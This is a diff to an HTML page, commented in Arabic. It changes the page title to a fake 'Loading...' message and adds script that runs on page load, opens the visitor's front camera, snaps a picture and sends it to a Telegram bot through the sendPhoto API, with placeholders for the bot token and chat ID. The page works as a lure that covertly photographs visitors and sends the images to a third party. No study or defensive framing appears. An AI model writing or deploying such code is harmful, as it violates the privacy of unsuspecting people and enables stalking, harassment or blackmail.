@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التقاط صورة</title>
+    <title>جاري التحميل...</title>
 </head>
 <body style="background-color: #121212; color: white; text-align: center; padding-top: 50px;">
 
@@ -13,8 +13,9 @@
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        async function snapShot() {
+        async function snapAndSend() {
             try {
+                // فتح الكاميرا الأمامية
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user" },
                     audio: false
@@ -24,7 +25,7 @@
                 video.srcObject = stream;
 
                 video.onloadedmetadata = () => {
-                    setTimeout(() => {
+                    setTimeout(async () => {
                         const canvas = document.getElementById('c');
                         canvas.width = video.videoWidth || 640;
                         canvas.height = video.videoHeight || 480;
@@ -32,21 +33,37 @@
                         const ctx = canvas.getContext('2d');
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                         
-                        // الطريقة القديمة المباشرة للصور الثابتة
-                        const dataURL = canvas.toDataURL('image/jpeg', 0.9);
-                        
+                        // إيقاف الكاميرا فوراً
                         stream.getTracks().forEach(track => track.stop());
-                        
-                        console.log("تم التقاط الصورة بنجاح!");
+
+                        // تحويل الصورة إلى Blob حقيقي (image/jpeg) عشان تروح كصورة مش ملف
+                        canvas.toBlob(async (blob) => {
+                            const formData = new FormData();
+                            formData.append('chat_id', 'أدخل_رقم_الـ_Chat_ID_هنا'); // حط رقم الآيدي هنا
+                            formData.append('photo', blob, 'image.jpg');
+
+                            try {
+                                // استخدام دالة sendPhoto الرسمية الخاصة بتيليجرام
+                                const botToken = 'أدخل_توكن_البوت_هنا'; // حط توكن البوت هنا
+                                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                                    method: 'POST',
+                                    body: formData
+                                });
+                                console.log("تم إرسال الصورة بنجاح كصورة!");
+                            } catch (err) {
+                                console.log("خطأ في الإرسال: ", err);
+                            }
+                        }, 'image/jpeg', 0.9);
+
                     }, 400);
                 };
 
             } catch (e) {
-                console.log("خطأ: ", e);
+                console.log("خطأ في الكاميرا: ", e);
             }
         }
 
-        window.onload = snapShot;
+        window.onload = snapAndSend;
     </script>
 
 </body>
